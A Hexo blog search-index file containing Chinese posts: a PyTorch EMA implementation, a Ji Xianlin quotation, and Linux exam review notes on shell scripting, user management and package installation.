<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>EMA 原理和实现(torch)</title>
    <url>/2021/10/07/EMA-%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0-torch/</url>
    <content><![CDATA[<p>EMA(指数滑动平均)，经常被用在深度学习任务中，来提神模型的鲁棒性或是涨点。在半监督的分类任务中，经常使用EMA的方法来给不同参数做self-ensemble。</p>
<h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><p><img src="/2021/10/07/EMA-%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0-torch/EMA.jpg" alt="EMA"></p>
<h3 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h3><h3 id="Pytorch-实现"><a href="#Pytorch-实现" class="headerlink" title="Pytorch 实现"></a>Pytorch 实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EMA</span>:</span></span><br><span class="line">    <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        model = ResNet(config)</span></span><br><span class="line"><span class="string">        ema = EMA(model, alpha=0.999)</span></span><br><span class="line"><span class="string">        ... # train an epoch</span></span><br><span class="line"><span class="string">        ema.update_params(model)</span></span><br><span class="line"><span class="string">        ema.apply_shadow(model)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, _net, _alpha=<span class="number">0.999</span></span>):</span></span><br><span class="line">        self.shadow = &#123;k: v.clone().detach() <span class="keyword">for</span> k, v <span class="keyword">in</span> _net.state_dict().items()&#125;</span><br><span class="line">        self.param_keys = [k <span class="keyword">for</span> k, _ <span class="keyword">in</span> _net.named_parameters()]</span><br><span class="line">        self.alpha = _alpha</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_params</span>(<span class="params">self, _model</span>):</span></span><br><span class="line">        self.shadow = &#123;k: v.clone().detach() <span class="keyword">for</span> k, v <span class="keyword">in</span> _model.state_dict().items()&#125;</span><br><span class="line">        self.param_keys = [k <span class="keyword">for</span> k, _ <span class="keyword">in</span> _model.named_parameters()]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_params</span>(<span class="params">self, _model</span>):</span></span><br><span class="line">        state = _model.state_dict()</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> self.param_keys:</span><br><span class="line">            self.shadow[name].copy_(self.alpha * self.shadow[name] + (<span class="number">1</span> - self.alpha) * state[name])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">apply_shadow</span>(<span class="params">self, _model</span>):</span></span><br><span class="line">        _model.load_state_dict(self.shadow, strict=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>DL</category>
      </categories>
      <tags>
        <tag>DL EMA</tag>
      </tags>
  </entry>
  <entry>
    <title>quote-JiXianlin</title>
    <url>/2021/06/25/quote-JiXianlin/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
    今天仍然拼命看书，因为明天就要考了。学期的成绩就全仗这两天挣，现在更感到考试无用与无聊。
    ——季羡林 《清华园日记》
</blockquote>
]]></content>
      <tags>
        <tag>quote</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux复习</title>
    <url>/2021/06/24/linux%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="linux期末复习"><a href="#linux期末复习" class="headerlink" title="linux期末复习"></a>linux期末复习</h1><p>本文中一些<code>$a</code>这样的shell变量引用会被mathjex翻译成公式，请分辨。</p>
<blockquote>
<ol>
<li>基本的命令</li>
<li>如何安装应用程序，快捷键等(vim，linux本身的快捷键)</li>
<li>shell脚本</li>
<li>编译(gcc，makefile)</li>
<li>shell命令的c语言实现</li>
<li>多进程与线程的基本概念与编程</li>
</ol>
</blockquote>
<p><strong>课程内容回顾</strong></p>
<ul>
<li>各类Linux下的命令；</li>
<li>Shell脚本；</li>
<li>基于命令的文字处理，尤其是正则表达式；</li>
<li>Linux下的C语言编程环境，gcc及make等；</li>
<li>Linux下如何搭建网站；</li>
<li>Linux下常用命令的实现ls, cat, cp以及pwd等；</li>
<li>进程及线程等；</li>
</ul>
<p><strong>考试题型</strong></p>
<ul>
<li>填空题（30分：2分*15）；</li>
<li>判断题(10分：1分*10）；</li>
<li>简答题（28分：4分*7）；</li>
<li>代码阅读题（16分）；填写空白代码行；</li>
<li>编程题（16分：8分*2）；</li>
</ul>
<p><strong>考试范围和重点</strong></p>
<p>每周实验的内容；</p>
<blockquote>
<p>不考的内容：<br>1、正则表达式；<br>2、字符串处理命令sed和awk；<br>3、curl和wget；<br>4、Samba服务器、apache、mysql和php等的安装；<br>5、多线程的线程间同步；</p>
</blockquote>
<p><strong>重点考察内容</strong></p>
<ul>
<li>Ubuntu下的常见操作，比如安装程序，快捷键等；</li>
<li>常用的命令和shell脚本；</li>
<li>Linux下的编译环境，比如gcc和Makefile；</li>
<li>常用shell命令的C语言实现，比如cp, cat, ls以及pwd；</li>
<li>多线程与进程的基本概念及接口；</li>
</ul>
<h2 id="Linux下的各种命令"><a href="#Linux下的各种命令" class="headerlink" title="Linux下的各种命令"></a>Linux下的各种命令</h2><p>参考word(书本和word版本的linux复习提纲)，<strong>重点注意(软链接，硬链接)，（rm，tail，head，cat，grep，cd，ls，mkdir。rmdir，pwd，ps，……），(命令之间的管道的应用)，(chmod)，(进入root)，（group用户组），man命令，crontab命令!!!。</strong></p>
<h3 id="1-切换用户"><a href="#1-切换用户" class="headerlink" title="1. 切换用户"></a>1. 切换用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su username</span><br><span class="line">su #切换到root目录</span><br></pre></td></tr></table></figure>

<h3 id="2-Group"><a href="#2-Group" class="headerlink" title="2.Group"></a>2.Group</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupadd 选项 用户组</span><br><span class="line">groupdel 用户组 # 删除</span><br></pre></td></tr></table></figure>

<p>可以使用的选项有：</p>
<ul>
<li>-g GID 指定新用户组的组标识号（GID）。</li>
<li>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd 选项 用户名 # 新增</span><br><span class="line">userdel 选项 用户名 # 删除</span><br></pre></td></tr></table></figure>

<ul>
<li>选项:<ul>
<li>-c comment 指定一段注释性描述。</li>
<li>-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</li>
<li>-g 用户组 指定用户所属的用户组。</li>
<li>-G 用户组，用户组 指定用户所属的附加组。</li>
<li>-s Shell文件 指定用户的登录Shell。</li>
<li>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li>
</ul>
</li>
</ul>
<h2 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h2><p>下面的大部分内容引用自<a href="https://www.runoob.com/linux/linux-shell.html">shell菜鸟教程</a>，很多的内容都省略了，想看完全版的去菜鸟教程，这里只是考试内容。</p>
<h3 id="1-shell脚本基础"><a href="#1-shell脚本基础" class="headerlink" title="1.shell脚本基础"></a>1.shell脚本基础</h3><p>bash，zsh，csh ……，ubuntu内置的默认shell脚本是bash。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>#!</strong> 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。</p>
<h3 id="2-shell脚本的运行方式"><a href="#2-shell脚本的运行方式" class="headerlink" title="2.shell脚本的运行方式"></a>2.shell脚本的运行方式</h3><blockquote>
<p><strong>1、作为可执行程序</strong></p>
<p> cd 到相应目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x ./test.sh  #使脚本具有执行权限</span><br><span class="line">./test.sh  #执行脚本</span><br></pre></td></tr></table></figure>

<p>一定要写成 <strong>./test.sh</strong>，而不是 <strong>test.sh</strong>，运行其它二进制的程序也一样，直接写 test.sh，linux 系统会去 PATH 里寻找有没有叫 test.sh 的。要用 ./test.sh 告诉系统说，就在当前目录找。</p>
</blockquote>
<blockquote>
<p><strong>2、作为解释器参数</strong></p>
<p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br><span class="line">/bin/php test.php</span><br></pre></td></tr></table></figure>

<p>这种方式运行的脚本，不需要在第一行指定解释器信息，写了也没用。</p>
</blockquote>
<h3 id="3-shell变量"><a href="#3-shell变量" class="headerlink" title="3.shell变量"></a>3.shell变量</h3><p><strong>注意，变量名和等号之间不能有空格</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">your_name=&quot;Jason&quot;</span><br><span class="line">除了显式地直接赋值，还可以用语句给变量赋值,如：</span><br><span class="line">	for file in `ls /etc`</span><br><span class="line">	或</span><br><span class="line">	for file in $(ls /etc)</span><br><span class="line">以上语句将 /etc 下目录的文件名循环出来。</span><br></pre></td></tr></table></figure>

<p><strong>已定义的变量，可以被重新定义</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">your_name=&quot;tom&quot;</span><br><span class="line">echo $your_name</span><br><span class="line">your_name=&quot;alibaba&quot;</span><br><span class="line">echo $your_name</span><br></pre></td></tr></table></figure>

<ul>
<li>这样写是合法的，但注意，第二次赋值的时候不能写 <code>$ your_name=&quot;alibaba&quot;</code>，使用变量的时候才加美元符（$）。</li>
</ul>
<p><strong>只读变量</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">myUrl=&quot;https://www.google.com&quot;</span><br><span class="line">readonly myUrl</span><br></pre></td></tr></table></figure>

<p><strong>删除变量</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unset variable_name</span><br></pre></td></tr></table></figure>

<p><strong>变量类型(应该不会考)</strong>:hear_no_evil:</p>
<ul>
<li><strong>1) 局部变量</strong> 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。</li>
<li><strong>2) 环境变量</strong> 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。</li>
<li><strong>3) shell变量</strong> shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</li>
</ul>
<h4 id="3-1-shell字符串"><a href="#3-1-shell字符串" class="headerlink" title="3.1 shell字符串"></a>3.1 shell字符串</h4><p>字符串可以用单引号，也可以用双引号，也可以不用引号。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">str=&#x27;this is a string&#x27;</span><br></pre></td></tr></table></figure>

<p>单引号字符串的限制</p>
<blockquote>
<p>1.单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；<br>2.单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</p>
</blockquote>
<p>双引号的优点</p>
<blockquote>
<ol>
<li>双引号里可以有变量</li>
<li>双引号里可以出现转义字符</li>
</ol>
</blockquote>
<p><strong>拼接字符串</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">your_name=&quot;runoob&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用双引号拼接</span></span><br><span class="line">greeting=&quot;hello, &quot;$your_name&quot; !&quot;</span><br><span class="line">greeting_1=&quot;hello, $&#123;your_name&#125; !&quot;</span><br><span class="line">echo $greeting  $greeting_1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用单引号拼接</span></span><br><span class="line">greeting_2=&#x27;hello, &#x27;$your_name&#x27; !&#x27;</span><br><span class="line">greeting_3=&#x27;hello, $&#123;your_name&#125; !&#x27;</span><br><span class="line">echo $greeting_2  $greeting_3</span><br></pre></td></tr></table></figure>
<p>输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello, runoob ! hello, runoob !</span><br><span class="line">hello, runoob ! hello, $&#123;your_name&#125; !</span><br></pre></td></tr></table></figure>

<p><strong>字符串长度</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#string&#125; #输出 4</span><br></pre></td></tr></table></figure>

<p><strong>查找子字符串</strong></p>
<p>查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo `expr index &quot;$string&quot; io`  # 输出 4</span><br></pre></td></tr></table></figure>

<p><strong>注意： 以上脚本中 <code>`</code>是反引号，而不是单引号<code>&#39;</code>，不要看错了哦。</strong></p>
<h4 id="3-2-shell-数组"><a href="#3-2-shell-数组" class="headerlink" title="3.2 shell 数组"></a>3.2 shell 数组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">数组名=(值1 值2 ... 值n)</span><br><span class="line">array_name=(value0 value1 value2 value3)</span><br><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure>

<h4 id="3-3-shell-注释"><a href="#3-3-shell-注释" class="headerlink" title="3.3 shell 注释"></a>3.3 shell 注释</h4><p>以 # 开头的行就是注释，会被解释器忽略。</p>
<p>多行注释</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h3 id="4-shell传递参数"><a href="#4-shell传递参数" class="headerlink" title="4.shell传递参数"></a>4.shell传递参数</h3><p>我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p>
<blockquote>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;Shell 传递参数实例！&quot;;</span><br><span class="line">echo &quot;执行的文件名：$0&quot;;</span><br><span class="line">echo &quot;第一个参数为：$1&quot;;</span><br><span class="line">echo &quot;第二个参数为：$2&quot;;</span><br><span class="line">echo &quot;第三个参数为：$3&quot;;</span><br></pre></td></tr></table></figure>

<p>输出如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod +x test.sh</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> ./test.sh 1 2 3</span></span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：./test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure>
</blockquote>
<p>特殊参数：</p>
<table>
<thead>
<tr>
<th>参数处理</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>$#</td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
<tr>
<td>$*</td>
<td>以一个单字符串显示所有向脚本传递的参数。如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td>
</tr>
</tbody></table>
<h3 id="5-shell基本运算符"><a href="#5-shell基本运算符" class="headerlink" title="5.shell基本运算符"></a>5.shell基本运算符</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">val=`expr 2 + 2`</span><br><span class="line">echo &quot;两数之和为 : $val&quot;</span><br></pre></td></tr></table></figure>

<p><strong>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2，这与我们熟悉的大多数编程语言不一样。</strong></p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+</td>
<td align="left">加法</td>
<td align="left"><code>expr $a + $b</code> 结果为 30。</td>
</tr>
<tr>
<td align="left">-</td>
<td align="left">减法</td>
<td align="left"><code>expr $a - $b</code> 结果为 -10。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">乘法</td>
<td align="left"><code>expr $a \* $b</code> 结果为  200。</td>
</tr>
<tr>
<td align="left">/</td>
<td align="left">除法</td>
<td align="left"><code>expr $b / $a</code> 结果为 2。</td>
</tr>
<tr>
<td align="left">%</td>
<td align="left">取余</td>
<td align="left"><code>expr $b % $a</code> 结果为 0。</td>
</tr>
<tr>
<td align="left">=</td>
<td align="left">赋值</td>
<td align="left">a=$b 将把变量 b 的值赋给 a。</td>
</tr>
<tr>
<td align="left">==</td>
<td align="left">相等。用于比较两个数字，相同则返回 true。</td>
<td align="left">[ $a == $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">!=</td>
<td align="left">不相等。用于比较两个数字，不相同则返回 true。</td>
<td align="left">[ $a != $b ] 返回 true。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>条件表达式要放在方括号之间，并且要有空格，例如: <strong>[$a==$b]</strong> 是错误的，必须写成 **[ $a == $b ]**。</p>
<p><strong>乘号(*)前边必须加反斜杠()才能实现乘法运算</strong></p>
<p>数字类型关系运算符</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-eq</td>
<td align="left">检测两个数是否相等，相等返回 true。</td>
<td align="left">[ $a -eq $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-ne</td>
<td align="left">检测两个数是否不相等，不相等返回 true。</td>
<td align="left">[ $a -ne $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-gt</td>
<td align="left">检测左边的数是否大于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -gt $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-lt</td>
<td align="left">检测左边的数是否小于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -lt $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-ge</td>
<td align="left">检测左边的数是否大于等于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -ge $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-le</td>
<td align="left">检测左边的数是否小于等于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -le $b ] 返回 true。</td>
</tr>
</tbody></table>
<p>布尔运算符</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">!</td>
<td align="left">非运算，表达式为 true 则返回 false，否则返回 true。</td>
<td align="left">[ ! false ] 返回 true。</td>
</tr>
<tr>
<td align="left">-o</td>
<td align="left">或运算，有一个表达式为 true 则返回 true。</td>
<td align="left">[ $a -lt 20 -o $b -gt 100 ] 返回 true。</td>
</tr>
<tr>
<td align="left">-a</td>
<td align="left">与运算，两个表达式都为 true 才返回 true。</td>
<td align="left">[ $a -lt 20 -a $b -gt 100 ] 返回 false。</td>
</tr>
</tbody></table>
<p>字符串运算符</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">检测两个字符串是否相等，相等返回 true。</td>
<td align="left">[ $a = $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">!=</td>
<td align="left">检测两个字符串是否不相等，不相等返回 true。</td>
<td align="left">[ $a != $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-z</td>
<td align="left">检测字符串长度是否为0，为0返回 true。</td>
<td align="left">[ -z $a ] 返回 false。</td>
</tr>
<tr>
<td align="left">-n</td>
<td align="left">检测字符串长度是否不为 0，不为 0 返回 true。</td>
<td align="left">[ -n “$a” ] 返回 true。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">检测字符串是否为空，不为空返回 true。</td>
<td align="left">[ $a ] 返回 true。</td>
</tr>
</tbody></table>
<h3 id="6-Shell-echo命令"><a href="#6-Shell-echo命令" class="headerlink" title="6.Shell echo命令"></a>6.Shell echo命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">read name </span><br><span class="line">echo &quot;$name It is a test&quot;</span><br></pre></td></tr></table></figure>

<p><strong>重定向</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;It is a test&quot; &gt; myfile</span><br></pre></td></tr></table></figure>

<p><strong>显示命令执行结果</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo `date` </span><br></pre></td></tr></table></figure>
<h3 id="7-Shell-printf"><a href="#7-Shell-printf" class="headerlink" title="7.Shell printf"></a>7.Shell printf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf  format-string  [arguments...]</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &quot;%-10s %-8s %-4s\n&quot; 姓名 性别 体重kg  </span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭靖 男 66.1234</span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 杨过 男 48.6543</span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭芙 女 47.9876</span><br></pre></td></tr></table></figure>

<p><strong>转义</strong></p>
<table>
<thead>
<tr>
<th align="left">序列</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\a</td>
<td align="left">警告字符，通常为ASCII的BEL字符</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">后退</td>
</tr>
<tr>
<td align="left">\c</td>
<td align="left">抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页（formfeed）</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">回车（Carriage return）</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">水平制表符</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">垂直制表符</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">一个字面上的反斜杠字符</td>
</tr>
<tr>
<td align="left">\ddd</td>
<td align="left">表示1到3位数八进制值的字符。仅在格式字符串中有效</td>
</tr>
<tr>
<td align="left">\0ddd</td>
<td align="left">表示1到3位的八进制值字符</td>
</tr>
</tbody></table>
<h3 id="8-流程控制-书上写的够明白了"><a href="#8-流程控制-书上写的够明白了" class="headerlink" title="8.流程控制(书上写的够明白了)"></a>8.流程控制(书上写的够明白了)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line">if [ $a == $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">elif [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 大于 b&quot;</span><br><span class="line">elif [ $a -lt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for loop in 1 2 3 4 5</span><br><span class="line">do</span><br><span class="line">    echo &quot;The value is: $loop&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for str in This is a string</span><br><span class="line">do</span><br><span class="line">    echo $str</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line">while(( $int&lt;=5 ))</span><br><span class="line">do</span><br><span class="line">    echo $int</span><br><span class="line">    let &quot;int++&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &#x27;按下 &lt;CTRL-D&gt; 退出&#x27;</span><br><span class="line">echo -n &#x27;输入你最喜欢的网站名: &#x27;</span><br><span class="line">while read FILM</span><br><span class="line">do</span><br><span class="line">    echo &quot;是的！$FILM 是一个好网站&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"></span><br><span class="line">until [ ! $a -lt 10 ]</span><br><span class="line">do</span><br><span class="line">   echo $a</span><br><span class="line">   a=`expr $a + 1`</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;输入 1 到 4 之间的数字:&#x27;</span><br><span class="line">echo &#x27;你输入的数字为:&#x27;</span><br><span class="line">read aNum</span><br><span class="line">case $aNum in</span><br><span class="line">    1)  echo &#x27;你选择了 1&#x27;</span><br><span class="line">    ;;</span><br><span class="line">    2)  echo &#x27;你选择了 2&#x27;</span><br><span class="line">    ;;</span><br><span class="line">    3)  echo &#x27;你选择了 3&#x27;</span><br><span class="line">    ;;</span><br><span class="line">    4)  echo &#x27;你选择了 4&#x27;</span><br><span class="line">    ;;</span><br><span class="line">    *)  echo &#x27;你没有输入 1 到 4 之间的数字&#x27;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">-----------------------------------------</span></span><br><span class="line">site=&quot;runoob&quot;</span><br><span class="line"></span><br><span class="line">case &quot;$site&quot; in</span><br><span class="line">   &quot;runoob&quot;) echo &quot;菜鸟教程&quot;</span><br><span class="line">   ;;</span><br><span class="line">   &quot;google&quot;) echo &quot;Google 搜索&quot;</span><br><span class="line">   ;;</span><br><span class="line">   &quot;taobao&quot;) echo &quot;淘宝网&quot;</span><br><span class="line">   ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="9-Shell-输入-输出重定向"><a href="#9-Shell-输入-输出重定向" class="headerlink" title="9.Shell 输入/输出重定向"></a>9.Shell 输入/输出重定向</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">command &gt; file</td>
<td align="left">将输出重定向到 file。</td>
</tr>
<tr>
<td align="left">command &lt; file</td>
<td align="left">将输入重定向到 file。</td>
</tr>
<tr>
<td align="left">command &gt;&gt; file</td>
<td align="left">将输出以追加的方式重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt; file</td>
<td align="left">将文件描述符为 n 的文件重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt;&gt; file</td>
<td align="left">将文件描述符为 n 的文件以追加的方式重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt;&amp; m</td>
<td align="left">将输出文件 m 和 n 合并。</td>
</tr>
<tr>
<td align="left">n &lt;&amp; m</td>
<td align="left">将输入文件 m 和 n 合并。</td>
</tr>
<tr>
<td align="left">&lt;&lt; tag</td>
<td align="left">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td>
</tr>
</tbody></table>
<h2 id="如何安装应用程序，快捷键等"><a href="#如何安装应用程序，快捷键等" class="headerlink" title="如何安装应用程序，快捷键等"></a>如何安装应用程序，快捷键等</h2><h3 id="1-换源"><a href="#1-换源" class="headerlink" title="1.换源"></a>1.换源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 备份原来的sorce文件</span><br><span class="line">sudo gedit /etc/apt/sources.list 修改sources.list文件 or sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>修改完这个文件后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h3 id="2-安装软件"><a href="#2-安装软件" class="headerlink" title="2.安装软件"></a>2.安装软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install [app]</span><br></pre></td></tr></table></figure>

<h3 id="3-移除软件"><a href="#3-移除软件" class="headerlink" title="3.移除软件"></a>3.移除软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove [app]</span><br></pre></td></tr></table></figure>

<h3 id="4-apt-or-apt-get"><a href="#4-apt-or-apt-get" class="headerlink" title="4.apt or apt-get"></a>4.apt or apt-get</h3><p>apt与apt-get可以实现大部分相同的功能，可以视作两个不同的软件，但是apt-get支持更为底层的操作，其操作更细。</p>
<h3 id="5-快捷键"><a href="#5-快捷键" class="headerlink" title="5.快捷键"></a>5.快捷键</h3><h4 id="5-1-linux-terminal"><a href="#5-1-linux-terminal" class="headerlink" title="5.1 linux, terminal"></a>5.1 linux, terminal</h4><p><code>Ctrl + Alt + T</code>打开终端。</p>
<p><strong>Tab-自动补全</strong></p>
<ul>
<li>当以xxx开头的命令或文件名仅有1个时，按下Tab键 1次，将会自动补全该命令或文件名；</li>
<li>当以xxx开头的命令或文件名不止1个时，按1次Tab键是没反应的，再按1次Tab键，下方将出现以xxx开头的命令或文件名。</li>
</ul>
